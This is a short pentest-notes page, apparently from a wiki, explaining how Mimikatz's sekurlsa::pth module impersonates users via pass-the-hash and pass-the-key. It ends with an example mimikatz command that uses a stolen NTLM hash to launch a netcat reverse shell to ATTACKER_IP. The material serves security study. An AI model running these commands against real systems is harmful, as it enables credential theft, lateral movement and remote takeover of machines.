# sekurlsa::pth

{% embed url="https://www.praetorian.com/blog/inside-mimikatz-part1/" %}

{% embed url="https://www.praetorian.com/blog/inside-mimikatz-part2/" %}

### Overview of how _Mimikatz_ implements the pass-the-hash technique

I aim to provide a general high-level overview of how the `sekurlsa::pth` module works to allow an attacker to impersonate a user.&#x20;

The `sekurlsa::pth` module allows an attacker to impersonate a user by spawning a new logon session on the local machine, and associating the attacker’s supplied credentials with that session. It will then launch a process specified by the attacker (reverse shell, etc.) under the context of the new forged session.

This entire process happens locally, and no external authentication is performed at this stage. However, subsequent network requests made from the new session will use the injected credentials, allowing us to perform lateral movement and other actions without knowing the actual password.

#### Technical details

The `sekurlsa::pth` method performs a **Pass-the-Hash** or **Pass-the-Key** attack for NTLM and Kerberos authentication respectively, that depends on the provided options (eg. `/ntlm` , `/rc4` , etc.).

Now, when we start a new command prompt session, we can verify that the injected Kerberos ticket is present using the `klist` command. Any external network connections (eg. `schtasks` , `sc.exe` , etc.) executed from that forged logon session will automatically use the injected credentials, giving us access as that particular user on the remote machine.

**a. Using stolen NTLM hash with NetNTLM authentication**

* When we receive a challenge from the remote server, the injected NTLM hash will be used to create the challenge response&#x20;



**b. Using stolen encryption key with Kerberos authentication**



#### Example

Suppose we have found a user's NTLM hash using the `lsadump::sam` or `sekurlsa::msv` methods. We can use the found hash to retrieve a shell session as the found user.

First, we need to establish a listener to catch the shell:

```sh
$ nc -lvnp PORT
```

Next, perform the attack:

{% code overflow="wrap" %}
```
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:"nc -e cmd.exe ATTACKER_IP PORT" 
```
{% endcode %}

Note that if we execute the `whoami` command, we will still see the original user we were using before performing the attack, but any commands executed from this session will use the injected credentials.

